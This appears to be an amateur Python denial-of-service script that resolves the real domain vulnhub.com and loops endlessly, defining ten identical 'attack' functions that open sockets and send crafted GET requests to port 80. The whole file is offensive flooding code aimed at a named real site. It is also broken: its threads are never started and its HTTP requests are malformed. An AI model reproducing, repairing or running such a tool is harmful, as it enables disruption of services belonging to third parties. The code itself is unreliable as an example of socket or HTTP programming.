import socket
import threading

ip = socket.gethostbyname("vulnhub.com")
pot = 80

request_send = 0


def go_dos():
    def attack1():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, pot))
        #send a get request in this web server
        s.sendto(("GET /"+ ip +"HTTP/1.1").encode("ascii"), (ip, pot))
        s.sendto(("HOST /"+ ip +"\r\n\r\n").encode("ascii"), (ip, pot))

    def attack2():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, pot))
        #send a get request in this web server
        s.sendto(("GET /"+ ip +"HTTP/1.1").encode("ascii"), (ip, pot))
        s.sendto(("HOST /"+ ip +"\r\n\r\n").encode("ascii"), (ip, pot))

    def attack3():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, pot))
        #send a get request in this web server
        s.sendto(("GET /"+ ip +"HTTP/1.1").encode("ascii"), (ip, pot))
        s.sendto(("HOST /"+ ip +"\r\n\r\n").encode("ascii"), (ip, pot))

    def attack4():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, pot))
        #send a get request in this web server
        s.sendto(("GET /"+ ip +"HTTP/1.1").encode("ascii"), (ip, pot))
        s.sendto(("HOST /"+ ip +"\r\n\r\n").encode("ascii"), (ip, pot))

    def attack5():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, pot))
        #send a get request in this web server
        s.sendto(("GET /"+ ip +"HTTP/1.1").encode("ascii"), (ip, pot))
        s.sendto(("HOST /"+ ip +"\r\n\r\n").encode("ascii"), (ip, pot))

    def attack6():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, pot))
        #send a get request in this web server
        s.sendto(("GET /"+ ip +"HTTP/1.1").encode("ascii"), (ip, pot))
        s.sendto(("HOST /"+ ip +"\r\n\r\n").encode("ascii"), (ip, pot))

    def attack7():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, pot))
        #send a get request in this web server
        s.sendto(("GET /"+ ip +"HTTP/1.1").encode("ascii"), (ip, pot))
        s.sendto(("HOST /"+ ip +"\r\n\r\n").encode("ascii"), (ip, pot))

    def attack8():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, pot))
        #send a get request in this web server
        s.sendto(("GET /"+ ip +"HTTP/1.1").encode("ascii"), (ip, pot))
        s.sendto(("HOST /"+ ip +"\r\n\r\n").encode("ascii"), (ip, pot))

    def attack9():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, pot))
        #send a get request in this web server
        s.sendto(("GET /"+ ip +"HTTP/1.1").encode("ascii"), (ip, pot))
        s.sendto(("HOST /"+ ip +"\r\n\r\n").encode("ascii"), (ip, pot))

    def attack10():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, pot))
        #send a get request in this web server
        s.sendto(("GET /"+ ip +"HTTP/1.1").encode("ascii"), (ip, pot))
        s.sendto(("HOST /"+ ip +"\r\n\r\n").encode("ascii"), (ip, pot))

    global request_send
    request_send +=1
    if request_send%1000==0:
        print(request_send)


    threading.Thread(target=attack1)
    threading.Thread(target=attack2)
    threading.Thread(target=attack3)
    threading.Thread(target=attack4)
    threading.Thread(target=attack5)
    threading.Thread(target=attack6)
    threading.Thread(target=attack7)
    threading.Thread(target=attack8)
    threading.Thread(target=attack9)
    threading.Thread(target=attack10)

   

while True:
    go_dos()



